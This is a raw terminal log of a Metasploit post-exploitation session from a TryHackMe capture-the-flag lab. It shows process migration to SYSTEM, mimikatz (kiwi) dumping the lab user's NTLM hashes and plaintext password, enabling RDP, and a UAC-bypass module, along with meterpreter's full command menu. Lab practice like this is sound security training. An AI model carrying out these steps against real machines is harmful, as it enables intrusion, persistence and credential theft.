+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1096  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
+ 1188  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1296  500   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
+ 1344  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+ 1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1380  2264  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
+ 1396  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
+ 1540  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1636  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1676  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1816  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1912  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2044  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
+ 2172  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
+ 2264  1316  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2380  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
+ 2412  816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
+ 2436  1484  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
+ 2588  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
+ 2620  816   rundll32.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\rundll32.exe
+ 2652  2620  dinotify.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\dinotify.exe
+ 2848  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+
+[4mmeterpreter[0m > migrat [Ke -N spoolsv.exe
+[0m[1m[34m[*][0m Migrating from 2436 to 1368...
+[1m[34m[*][0m Migration completed successfully.
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > load ik[K[Kkiwi
+[0mLoading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+[4mmeterpreter[0m > creds_all
+[0m[1m[32m[+][0m Running as SYSTEM
+[1m[34m[*][0m Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+[4mmeterpreter[0m > run post/windows/manage/enable_rdp
+[0m
+[1m[34m[*][0m Enabling Remote Desktop
+[1m[34m[*][0m 	RDP is already enabled
+[1m[34m[*][0m Setting Terminal Services service startup mode
+[1m[34m[*][0m 	The Terminal Services service is not set to auto, changing it to auto ...
+[1m[34m[*][0m 	Opening port in local firewall if necessary
+[1m[34m[*][0m For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201114124733_default_10.10.229.185_host.windows.cle_981450.txt
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.229.185 - Meterpreter session 2 closed.  Reason: User exit
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> exit
+[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> ext[Kit -y
+[0m[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Ice[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Ice[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Ice[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Ice[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Ice[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Ice[00m# exit
+[?2004lexit
+
+Script done on 2020-11-14 12:49:03-03:00 [COMMAND_EXIT_CODE="0"]
